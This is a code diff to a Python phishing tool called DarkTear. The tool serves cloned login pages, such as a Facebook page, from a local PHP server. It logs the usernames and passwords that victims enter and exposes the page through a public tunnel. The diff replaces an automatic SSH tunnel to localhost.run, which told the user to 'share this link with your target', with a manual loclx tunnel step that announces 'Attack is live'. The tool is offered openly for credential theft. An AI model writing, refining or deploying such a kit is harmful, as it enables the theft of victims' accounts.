@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # DarkTear v1.0 - by WastelandX
-# SIMPLE: Logo → Pick Page → Tunnel Auto-Start (localhost.run)
-# Works with mixed-case filenames in 'page/' folder.
+# MANUAL TUNNEL MODE: user runs tunnel separately.
 
 import os
 import sys
@@ -14,7 +13,7 @@ from datetime import datetime
 # ========== COLORS ==========
 R = '\033[91m'          # Red
 B = '\033[96m'          # Electric Blue (for other elements)
-DB = '\033[34m'         # Dark Blue (non-bold, for tunnel logo)
+DB = '\033[34m'         # Dark Blue (for tunnel logo)
 O = '\033[93m'          # Orange
 G = '\033[92m'          # Green
 Y = '\033[93m'          # Yellow
@@ -80,10 +79,8 @@ def show_page_menu():
     for i in range(len(left)):
         l_num, l_name = left[i]
         r_num, r_name = right[i] if i < len(right) else ("", "")
-        # Left column: two spaces after the closing bracket
         left_str = f"  {O}[{l_num}]{W}  {l_name:20}{RS}"
         if r_num:
-            # Right column: also two spaces after bracket
             right_str = f"  {O}[{r_num}]{W}  {r_name}{RS}"
             print(left_str + right_str)
         else:
@@ -91,15 +88,10 @@ def show_page_menu():
     print(f"\n{R}" + "═"*60 + f"{RS}")
 
 def find_page_file(choice, page_name):
-    """
-    Find the HTML file in 'page/' folder, case-insensitive.
-    Returns full path if found, else None.
-    """
     base_dir = "page"
     if not os.path.isdir(base_dir):
         return None
 
-    # Try common filename patterns (lowercase, original, with spaces replaced)
     candidates = [
         f"{page_name.lower()}.html",
         f"{page_name}.html",
@@ -107,17 +99,15 @@ def find_page_file(choice, page_name):
         page_name.replace(" ", "_") + ".html",
         page_name.lower().replace(" ", "") + ".html",
         page_name.replace(" ", "") + ".html",
+        f"{choice}_{page_name.lower()}.html",
+        f"{choice}_{page_name}.html",
     ]
-    # Also try using the choice number prefix (some users might have 01_facebook.html etc.)
-    candidates.append(f"{choice}_{page_name.lower()}.html")
-    candidates.append(f"{choice}_{page_name}.html")
 
     for cand in candidates:
         full = os.path.join(base_dir, cand)
         if os.path.isfile(full):
             return full
 
-    # If still not found, do a case-insensitive glob search
     pattern = os.path.join(base_dir, "*")
     files = glob.glob(pattern)
     for f in files:
@@ -129,7 +119,7 @@ def find_page_file(choice, page_name):
             return f
     return None
 
-# ========== SERVER & TUNNEL ==========
+# ========== PHP SERVER (always runs) ==========
 def start_php_server(port=8080):
     try:
         proc = subprocess.Popen(
@@ -143,55 +133,16 @@ def start_php_server(port=8080):
         print(f"{R}[-] PHP not found. Install PHP first.{RS}")
         return None
 
-def start_localhost_run(port=8080):
-    print(f"{G}[+] Connecting to localhost.run...{RS}")
-    try:
-        proc = subprocess.Popen(
-            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "localhost.run"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,   # Merge stderr into stdout
-            text=True,
-            bufsize=1
-        )
-        url_found = False
-        url = None
-        print(f"{B}[i] Tunnel output (waiting for URL):{RS}")
-        start_time = time.time()
-        timeout = 15  # seconds to wait for URL before warning
-        while not url_found:
-            # Check if process is still alive
-            if proc.poll() is not None:
-                print(f"{R}[-] SSH process terminated unexpectedly.{RS}")
-                break
-            # Read a line (non‑blocking with short timeout)
-            line = proc.stdout.readline()
-            if not line:
-                # No output yet, sleep a bit
-                time.sleep(0.2)
-                # Timeout warning
-                if time.time() - start_time > timeout:
-                    print(f"{Y}[!] Still waiting for URL... (tunnel may be slow){RS}")
-                    start_time = time.time()  # reset timer to avoid spam
-                continue
-            print(line.strip())
-            # Look for a line containing https:// and .localhost.run
-            if "https://" in line and ".localhost.run" in line:
-                parts = line.strip().split()
-                for part in parts:
-                    if part.startswith("https://") and ".localhost.run" in part:
-                        url = part
-                        break
-                if url is None:
-                    url = line.strip()  # fallback
-                print(f"\n{G}[+] Public URL: {DB}{url}{RS}")
-                print(f"{Y}[!] Share this link with your target.{RS}\n")
-                url_found = True
-        if not url_found:
-            print(f"{Y}[!] Could not automatically detect the URL. Please look for it in the output above.{RS}")
-        return proc
-    except Exception as e:
-        print(f"{R}[-] Tunnel failed: {e}{RS}")
-        return None
+# ========== MANUAL TUNNEL HANDLER ==========
+def manual_tunnel_setup():
+    """Show instructions and ask for public URL."""
+    print(f"\n{Y}[!] MANUAL TUNNEL REQUIRED{RS}")
+    print(f"{W}1. Open a new terminal.{RS}")
+    print(f"{W}2. Run: {G}loclx tunnel http --to localhost:8080{RS}")
+    print(f"{W}3. Copy the public URL (e.g., https://xxxx.loclx.io){RS}")
+    print(f"{W}4. Paste it below.\n{RS}")
+    url = input(f"{O}[?]{W} Enter public URL: {RS}").strip()
+    return url
 
 # ========== CREDENTIAL LOGGER ==========
 def log_credentials(page, username, password, ip="Unknown"):
@@ -230,12 +181,10 @@ def main():
     if not php:
         sys.exit(1)
 
-    tunnel = start_localhost_run()
-    if not tunnel:
-        php.terminate()
-        sys.exit(1)
-
-    print(f"\n{Y}[!] Press Ctrl+C to stop the attack{RS}\n")
+    # Manual tunnel step
+    public_url = manual_tunnel_setup()
+    print(f"\n{G}[+] Attack is live at: {DB}{public_url}{RS}")
+    print(f"{Y}[!] Press Ctrl+C to stop the attack{RS}\n")
 
     try:
         while True:
@@ -243,7 +192,6 @@ def main():
     except KeyboardInterrupt:
         print(f"\n{Y}[!] Shutting down...{RS}")
         php.terminate()
-        tunnel.terminate()
         print(f"{G}[+] DarkTear stopped{RS}")
 
 if __name__ == "__main__":
